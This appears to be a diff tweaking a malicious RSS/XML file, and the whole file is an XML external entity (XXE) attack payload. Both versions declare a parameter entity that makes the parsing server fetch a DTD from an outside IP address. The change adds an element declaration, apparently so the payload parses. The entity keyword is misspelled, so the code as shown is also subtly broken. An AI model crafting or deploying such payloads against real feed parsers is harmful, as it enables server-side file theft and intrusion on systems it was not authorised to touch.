@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE rss[<!ENTITIY % dtd SYSTEM 'http://35.180.29.78/c-tool-f/xxe_jump_1.xml'> %dtd;]>
+<!DOCTYPE rss[<!ELEMENT rss ANY><!ENTITIY % dtd SYSTEM 'http://35.180.29.78/c-tool-f/xxe_jump_1.xml'> %dtd;]>
 <rss version="2.0">
     <channel>
         <item>
